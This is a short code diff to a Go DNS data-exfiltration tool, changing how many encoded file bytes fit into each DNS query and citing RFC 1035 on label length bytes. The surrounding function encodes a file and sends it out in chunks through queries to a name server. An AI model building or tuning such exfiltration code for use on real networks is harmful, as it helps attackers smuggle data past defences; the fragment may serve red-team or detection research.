@@ -48,8 +48,18 @@ func (ex *dnsExfiltrator) ExfiltrateFile(filename string) {
 
 	encodedData := encodeToModifiedBase64(data)
 
-	// Subtract 1 to account for the period that delimits the data being exfiltrated and the name server.
-	numOfBytesPerQuery := MAX_DOMAIN_NAME_LENGTH - len(ex.NameServer) - 1
+	// Domain names in messages are expressed in terms of a sequence of labels.
+	// Each label is represented as a one octet length field followed by that
+	// number of octets.  Since every domain name ends with the null label of
+	// the root, a domain name is terminated by a length byte of zero.  The
+	// high order two bits of every length octet must be zero, and the
+	// remaining six bits of the length field limit the label to 63 octets or
+	// less.
+	// - https://www.rfc-editor.org/rfc/rfc1035#section-3.1
+	//
+	// This means that we need to take into account the length byte at the very
+	// start as well as at the very end, hence subtract 2.
+	numOfBytesPerQuery := MAX_DOMAIN_NAME_LENGTH - len(ex.NameServer) - 2
 
 	for len(encodedData) != 0 {
 		bytesLeft := numOfBytesPerQuery
